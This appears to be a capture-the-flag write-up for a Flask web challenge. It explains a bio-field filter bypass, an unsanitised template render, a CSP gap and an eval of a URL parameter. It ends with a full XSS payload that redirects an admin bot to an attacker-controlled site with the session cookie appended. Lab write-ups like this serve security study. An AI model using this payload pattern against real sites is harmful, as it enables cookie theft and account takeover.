+++
title = "My Flask App Revenge"
date = 2025-07-06
authors = ["Abizer Lokhandwala"]
+++

### My Flask App Rev Writeup

First looking at all accesable endpoints in app.py

   1. /
   2. /register 
   3. /update_bio
   4. /login 
   5. /users 
   6. /api/users 
   7. /render 
   8. /report 

By breifly looking at all the functions and templates we can kind of guess a possible attack vector that is the bio we can inject some code into the bio and the bot will render it and execute the code  

Looking into all the functions in more detail the regiter and login parts work as intended there is nothing of interest there.  
The report is important with a get request we see that it just goes to a page with a form that sends a post req to itself.  
A post req creates a bot that just visits the /users?name={our input}.  
Visit is an import from bot.py it opens a headless chromium browser that logs in as admin and adds a cookie with the flag.  

It does have a lax samesitepolicy which means that we can access that cookie easily from a completely different website so our payload needs to just redirect the bot to out website and that can just take the cookie.  

So what is in /users?name={user}  
It renders user.html template  
Basically uses the scripts index and users  

#### Index.js (important sections):  
Sets window name to not admin other than that it seems to be normal and nothing seems interesting it is just a handler script takes forms and sends post requests.  

#### Users.js (important sections):  
Takes the name parameter fetches api/users?name={name} this makes an iframe with /render?all keys stored in the db associated with this user in the revenge part it url encodes & so that we cant have a key &bio to trick this.  
If window name is "admin" it takes the get param "js" and executes it.  

#### Api/users:  
It looks in the db for the user and gives all fields from the db except password and id.  

#### /Render:  
Loads the bio with |safe meaning it assumes the output will be safe and wont sanatize it this is vulnerable.  

From this our attack vector will be to inject some code into the bio section.  

#### /Update_bio:  
It only allows post req  
Takes username from session looks at the json payload sent and filters the "bio" key next it just add the payload to our db this is good it means we can do something like &bio or amp;bio and since in this stage the key is not "bio" it wont be filtered and so we can inject code. 

```py
data = request.json
    if "username" in data or "password" in data:
        return jsonify({"error": "Cannot update username or password"}), 400
    bio = data.get("bio", "")   
    if not bio or any(
        char not in "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 "
        for char in bio
    ):
        return jsonify({"error": "Invalid bio"}), 400

    result = users_collection.update_one({"username": username}, {"$set": data})
    if result.matched_count > 0:
        return jsonify({"message": "Bio updated successfully"}), 200
    else:
        return jsonify({"error": "Failed to update bio"}), 500
``` 

Now crafting the payload we can send we know the key will be amp;bio but the csp will not allow us to execute js directly in the render page.  

#### CSP Setup:
```py
# set CSP header for all responses
@app.after_request
def set_csp(response):
    response.headers["Content-Security-Policy"] = (
        "default-src 'self'; script-src 'self' 'unsafe-eval'; style-src 'self' ;"
    )
    return response
```

So instead we must use the ?js param in the users.js page so our vulnerable entry point is /render and we want to somehow add out payload into a ?js parameter  

#### Users.js snippet:
```json
if(window.name=="admin"){
            js = urlParams.get('js');
            if(js){
                eval(js);
            }
            
    }
```

We can use the meta tag for this since it is not disabled in the csp.  

Srcdoc basicaly refers to this page itself if we add a meta tag to redirect to about:srcdoc?js=payload we can get cookie also we need to include the /users.js to the page we can also add that as a script tag.  
Note that the csp doesnt stop html tags and sources it just stops execution of js on out browser.  

### Final Payload:

```json
{ "bio":"a", "amp;bio":"<iframe name=admin src=about:srcdoc? srcdoc=\"<meta http-equiv=refresh content='1; url=about:srcdoc?js=top.location=`our site url`.concat(document.cookie);'><script src=/static/users.js?js=alert();></script>\">" }
```

Sending this as the payload to update bio and then reporting the user will get us the flag.

